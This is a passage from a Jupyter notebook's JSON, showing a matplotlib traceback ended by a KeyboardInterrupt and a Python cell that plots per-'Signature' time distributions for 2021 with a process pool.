      "\u001B[1;32m~\\AppData\\Local\\Temp/ipykernel_32044/1267083564.py\u001B[0m in \u001B[0;36mtask\u001B[1;34m(s, d)\u001B[0m\n\u001B[0;32m     11\u001B[0m     \u001B[1;32mdef\u001B[0m \u001B[0mtask\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0ms\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0md\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m     12\u001B[0m         \u001B[0mprint\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;34m\"START\"\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m---> 13\u001B[1;33m         visualizeTimeData(d, starting=starting.timestamp(), ending=ending.timestamp(), title=str(s) + 'の期間分布',\n\u001B[0m\u001B[0;32m     14\u001B[0m                           loc='Signatureごとの期間分布')\n\u001B[0;32m     15\u001B[0m         \u001B[0mprint\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;34m\"COMPLETE\"\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32m~\\PycharmProjects\\ProjectRoute112021\\Grapher.py\u001B[0m in \u001B[0;36mvisualizeTimeData\u001B[1;34m(records, starting, ending, period, title, loc, x_axis)\u001B[0m\n\u001B[0;32m     50\u001B[0m     \u001B[1;32mif\u001B[0m \u001B[1;32mnot\u001B[0m \u001B[0mPath\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mlocation\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mexists\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m     51\u001B[0m         \u001B[0mos\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mmkdir\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mlocation\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m---> 52\u001B[1;33m     \u001B[0mplt\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0msavefig\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;34m'graphs\\\\'\u001B[0m \u001B[1;33m+\u001B[0m \u001B[0mloc\u001B[0m \u001B[1;33m+\u001B[0m \u001B[1;34m'\\\\'\u001B[0m \u001B[1;33m+\u001B[0m \u001B[0mtitle\u001B[0m\u001B[1;33m[\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;36m60\u001B[0m\u001B[1;33m]\u001B[0m \u001B[1;33m+\u001B[0m \u001B[1;34m'.png'\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mdpi\u001B[0m\u001B[1;33m=\u001B[0m\u001B[1;36m300\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mbbox_inches\u001B[0m\u001B[1;33m=\u001B[0m\u001B[1;34m\"tight\"\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mpad_inches\u001B[0m\u001B[1;33m=\u001B[0m\u001B[1;36m0.1\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m\u001B[0;32m     53\u001B[0m     \u001B[0mplt\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mclose\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m     54\u001B[0m     \u001B[1;32mreturn\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\pyplot.py\u001B[0m in \u001B[0;36msavefig\u001B[1;34m(*args, **kwargs)\u001B[0m\n\u001B[0;32m    956\u001B[0m \u001B[1;32mdef\u001B[0m \u001B[0msavefig\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m*\u001B[0m\u001B[0margs\u001B[0m\u001B[1;33m,\u001B[0m \u001B[1;33m**\u001B[0m\u001B[0mkwargs\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m    957\u001B[0m     \u001B[0mfig\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mgcf\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m--> 958\u001B[1;33m     \u001B[0mres\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mfig\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0msavefig\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m*\u001B[0m\u001B[0margs\u001B[0m\u001B[1;33m,\u001B[0m \u001B[1;33m**\u001B[0m\u001B[0mkwargs\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m\u001B[0;32m    959\u001B[0m     \u001B[0mfig\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mcanvas\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mdraw_idle\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m   \u001B[1;31m# need this if 'transparent=True' to reset colors\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m    960\u001B[0m     \u001B[1;32mreturn\u001B[0m \u001B[0mres\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\figure.py\u001B[0m in \u001B[0;36msavefig\u001B[1;34m(self, fname, transparent, **kwargs)\u001B[0m\n\u001B[0;32m   3017\u001B[0m                         ax.patch._cm_set(facecolor='none', edgecolor='none'))\n\u001B[0;32m   3018\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 3019\u001B[1;33m             \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mcanvas\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mprint_figure\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mfname\u001B[0m\u001B[1;33m,\u001B[0m \u001B[1;33m**\u001B[0m\u001B[0mkwargs\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m\u001B[0;32m   3020\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   3021\u001B[0m     def ginput(self, n=1, timeout=30, show_clicks=True,\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\backend_bases.py\u001B[0m in \u001B[0;36mprint_figure\u001B[1;34m(self, filename, dpi, facecolor, edgecolor, orientation, format, bbox_inches, pad_inches, bbox_extra_artists, backend, **kwargs)\u001B[0m\n\u001B[0;32m   2297\u001B[0m             \u001B[1;32mif\u001B[0m \u001B[0mbbox_inches\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   2298\u001B[0m                 \u001B[1;32mif\u001B[0m \u001B[0mbbox_inches\u001B[0m \u001B[1;33m==\u001B[0m \u001B[1;34m\"tight\"\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 2299\u001B[1;33m                     bbox_inches = self.figure.get_tightbbox(\n\u001B[0m\u001B[0;32m   2300\u001B[0m                         renderer, bbox_extra_artists=bbox_extra_artists)\n\u001B[0;32m   2301\u001B[0m                     \u001B[1;32mif\u001B[0m \u001B[0mpad_inches\u001B[0m \u001B[1;32mis\u001B[0m \u001B[1;32mNone\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\figure.py\u001B[0m in \u001B[0;36mget_tightbbox\u001B[1;34m(self, renderer, bbox_extra_artists)\u001B[0m\n\u001B[0;32m   1639\u001B[0m                 \u001B[1;31m# need this conditional....\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   1640\u001B[0m                 \u001B[1;32mtry\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 1641\u001B[1;33m                     bbox = ax.get_tightbbox(\n\u001B[0m\u001B[0;32m   1642\u001B[0m                         renderer, bbox_extra_artists=bbox_extra_artists)\n\u001B[0;32m   1643\u001B[0m                 \u001B[1;32mexcept\u001B[0m \u001B[0mTypeError\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\axes\\_base.py\u001B[0m in \u001B[0;36mget_tightbbox\u001B[1;34m(self, renderer, call_axes_locator, bbox_extra_artists, for_layout_only)\u001B[0m\n\u001B[0;32m   4626\u001B[0m             \u001B[1;32mif\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0myaxis\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mget_visible\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   4627\u001B[0m                 \u001B[1;32mtry\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 4628\u001B[1;33m                     bb_yaxis = self.yaxis.get_tightbbox(\n\u001B[0m\u001B[0;32m   4629\u001B[0m                         renderer, for_layout_only=for_layout_only)\n\u001B[0;32m   4630\u001B[0m                 \u001B[1;32mexcept\u001B[0m \u001B[0mTypeError\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\axis.py\u001B[0m in \u001B[0;36mget_tightbbox\u001B[1;34m(self, renderer, for_layout_only)\u001B[0m\n\u001B[0;32m   1101\u001B[0m             \u001B[1;32mreturn\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   1102\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 1103\u001B[1;33m         \u001B[0mticks_to_draw\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0m_update_ticks\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m\u001B[0;32m   1104\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   1105\u001B[0m         \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0m_update_label_position\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mrenderer\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\axis.py\u001B[0m in \u001B[0;36m_update_ticks\u001B[1;34m(self)\u001B[0m\n\u001B[0;32m   1043\u001B[0m         \u001B[0mthe\u001B[0m \u001B[0maxes\u001B[0m\u001B[1;33m.\u001B[0m  \u001B[0mReturn\u001B[0m \u001B[0mthe\u001B[0m \u001B[0mlist\u001B[0m \u001B[0mof\u001B[0m \u001B[0mticks\u001B[0m \u001B[0mthat\u001B[0m \u001B[0mwill\u001B[0m \u001B[0mbe\u001B[0m \u001B[0mdrawn\u001B[0m\u001B[1;33m.\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   1044\u001B[0m         \"\"\"\n\u001B[1;32m-> 1045\u001B[1;33m         \u001B[0mmajor_locs\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mget_majorticklocs\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m\u001B[0;32m   1046\u001B[0m         \u001B[0mmajor_labels\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mmajor\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mformatter\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mformat_ticks\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mmajor_locs\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   1047\u001B[0m         \u001B[0mmajor_ticks\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mget_major_ticks\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mlen\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mmajor_locs\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\axis.py\u001B[0m in \u001B[0;36mget_majorticklocs\u001B[1;34m(self)\u001B[0m\n\u001B[0;32m   1275\u001B[0m     \u001B[1;32mdef\u001B[0m \u001B[0mget_majorticklocs\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mself\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   1276\u001B[0m         \u001B[1;34m\"\"\"Return this Axis' major tick locations in data coordinates.\"\"\"\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 1277\u001B[1;33m         \u001B[1;32mreturn\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mmajor\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mlocator\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m\u001B[0;32m   1278\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   1279\u001B[0m     \u001B[1;32mdef\u001B[0m \u001B[0mget_minorticklocs\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mself\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\ticker.py\u001B[0m in \u001B[0;36m__call__\u001B[1;34m(self)\u001B[0m\n\u001B[0;32m   2112\u001B[0m     \u001B[1;32mdef\u001B[0m \u001B[0m__call__\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mself\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   2113\u001B[0m         \u001B[0mvmin\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mvmax\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0maxis\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mget_view_interval\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 2114\u001B[1;33m         \u001B[1;32mreturn\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mtick_values\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mvmin\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mvmax\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m\u001B[0;32m   2115\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   2116\u001B[0m     \u001B[1;32mdef\u001B[0m \u001B[0mtick_values\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mself\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mvmin\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mvmax\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\ticker.py\u001B[0m in \u001B[0;36mtick_values\u001B[1;34m(self, vmin, vmax)\u001B[0m\n\u001B[0;32m   2120\u001B[0m         vmin, vmax = mtransforms.nonsingular(\n\u001B[0;32m   2121\u001B[0m             vmin, vmax, expander=1e-13, tiny=1e-14)\n\u001B[1;32m-> 2122\u001B[1;33m         \u001B[0mlocs\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0m_raw_ticks\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mvmin\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mvmax\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m\u001B[0;32m   2123\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   2124\u001B[0m         \u001B[0mprune\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0m_prune\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\ticker.py\u001B[0m in \u001B[0;36m_raw_ticks\u001B[1;34m(self, vmin, vmax)\u001B[0m\n\u001B[0;32m   2059\u001B[0m         \u001B[1;32mif\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0m_nbins\u001B[0m \u001B[1;33m==\u001B[0m \u001B[1;34m'auto'\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   2060\u001B[0m             \u001B[1;32mif\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0maxis\u001B[0m \u001B[1;32mis\u001B[0m \u001B[1;32mnot\u001B[0m \u001B[1;32mNone\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 2061\u001B[1;33m                 nbins = np.clip(self.axis.get_tick_space(),\n\u001B[0m\u001B[0;32m   2062\u001B[0m                                 max(1, self._min_n_ticks - 1), 9)\n\u001B[0;32m   2063\u001B[0m             \u001B[1;32melse\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\axis.py\u001B[0m in \u001B[0;36mget_tick_space\u001B[1;34m(self)\u001B[0m\n\u001B[0;32m   2523\u001B[0m     \u001B[1;32mdef\u001B[0m \u001B[0mget_tick_space\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mself\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   2524\u001B[0m         \u001B[0mends\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mmtransforms\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mBbox\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mfrom_bounds\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;36m0\u001B[0m\u001B[1;33m,\u001B[0m \u001B[1;36m0\u001B[0m\u001B[1;33m,\u001B[0m \u001B[1;36m1\u001B[0m\u001B[1;33m,\u001B[0m \u001B[1;36m1\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 2525\u001B[1;33m         ends = ends.transformed(self.axes.transAxes -\n\u001B[0m\u001B[0;32m   2526\u001B[0m                                 self.figure.dpi_scale_trans)\n\u001B[0;32m   2527\u001B[0m         \u001B[0mlength\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mends\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mheight\u001B[0m \u001B[1;33m*\u001B[0m \u001B[1;36m72\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\transforms.py\u001B[0m in \u001B[0;36mtransformed\u001B[1;34m(self, transform)\u001B[0m\n\u001B[0;32m    490\u001B[0m         \"\"\"\n\u001B[0;32m    491\u001B[0m         \u001B[0mpts\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mget_points\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m--> 492\u001B[1;33m         ll, ul, lr = transform.transform(np.array(\n\u001B[0m\u001B[0;32m    493\u001B[0m             [pts[0], [pts[0, 0], pts[1, 1]], [pts[1, 0], pts[0, 1]]]))\n\u001B[0;32m    494\u001B[0m         \u001B[1;32mreturn\u001B[0m \u001B[0mBbox\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m[\u001B[0m\u001B[0mll\u001B[0m\u001B[1;33m,\u001B[0m \u001B[1;33m[\u001B[0m\u001B[0mlr\u001B[0m\u001B[1;33m[\u001B[0m\u001B[1;36m0\u001B[0m\u001B[1;33m]\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mul\u001B[0m\u001B[1;33m[\u001B[0m\u001B[1;36m1\u001B[0m\u001B[1;33m]\u001B[0m\u001B[1;33m]\u001B[0m\u001B[1;33m]\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\transforms.py\u001B[0m in \u001B[0;36mtransform\u001B[1;34m(self, values)\u001B[0m\n\u001B[0;32m   1501\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   1502\u001B[0m         \u001B[1;31m# Transform the values\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 1503\u001B[1;33m         \u001B[0mres\u001B[0m \u001B[1;33m=\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mtransform_affine\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mtransform_non_affine\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mvalues\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m\u001B[0;32m   1504\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   1505\u001B[0m         \u001B[1;31m# Convert the result back to the shape of the input values.\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\transforms.py\u001B[0m in \u001B[0;36mtransform_affine\u001B[1;34m(self, points)\u001B[0m\n\u001B[0;32m   2417\u001B[0m     \u001B[1;32mdef\u001B[0m \u001B[0mtransform_affine\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mself\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mpoints\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   2418\u001B[0m         \u001B[1;31m# docstring inherited\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 2419\u001B[1;33m         \u001B[1;32mreturn\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mget_affine\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mtransform\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mpoints\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0m\u001B[0;32m   2420\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   2421\u001B[0m     \u001B[1;32mdef\u001B[0m \u001B[0mtransform_non_affine\u001B[0m\u001B[1;33m(\u001B[0m\u001B[0mself\u001B[0m\u001B[1;33m,\u001B[0m \u001B[0mpoints\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32mc:\\users\\shion\\pycharmprojects\\projectroute112021\\venv\\lib\\site-packages\\matplotlib\\transforms.py\u001B[0m in \u001B[0;36mget_affine\u001B[1;34m(self)\u001B[0m\n\u001B[0;32m   2444\u001B[0m             \u001B[1;32mreturn\u001B[0m \u001B[0mself\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0m_b\u001B[0m\u001B[1;33m.\u001B[0m\u001B[0mget_affine\u001B[0m\u001B[1;33m(\u001B[0m\u001B[1;33m)\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[0;32m   2445\u001B[0m         \u001B[1;32melse\u001B[0m\u001B[1;33m:\u001B[0m\u001B[1;33m\u001B[0m\u001B[1;33m\u001B[0m\u001B[0m\n\u001B[1;32m-> 2446\u001B[1;33m             return Affine2D(np.dot(self._b.get_affine().get_matrix(),\n\u001B[0m\u001B[0;32m   2447\u001B[0m                                    self._a.get_affine().get_matrix()))\n\u001B[0;32m   2448\u001B[0m \u001B[1;33m\u001B[0m\u001B[0m\n",
      "\u001B[1;32m<__array_function__ internals>\u001B[0m in \u001B[0;36mdot\u001B[1;34m(*args, **kwargs)\u001B[0m\n",
      "\u001B[1;31mKeyboardInterrupt\u001B[0m: "
     ]
    },
    {
     "data": {
      "text/plain": "<Figure size 864x216 with 1 Axes>",
      "image/png": "[encoded data removed]"
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "import concurrent\n",
    "from Grapher import *\n",
    "from concurrent.futures import ThreadPoolExecutor\n",
    "from concurrent.futures import ProcessPoolExecutor\n",
    "\n",
    "plt.rcParams[\"figure.figsize\"] = [12, 3]\n",
    "starting = pd.to_datetime(\"2021/1/1 00:00:00\")\n",
    "ending = pd.to_datetime(\"2021/12/31 00:00:00\")\n",
    "\n",
    "with ProcessPoolExecutor(5) as e:\n",
    "    def task(s, d):\n",
    "        print(\"START\")\n",
    "        visualizeTimeData(d, starting=starting.timestamp(), ending=ending.timestamp(), title=str(s) + 'の期間分布',\n",
    "                          loc='Signatureごとの期間分布')\n",
    "        print(\"COMPLETE\")\n",
    "        plt.close()\n",
    "    for s, d in dataS.items():\n",
    "        e.submit(task(s, d))"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n"
    }
   }
  },
  {
   "cell_type": "markdown",
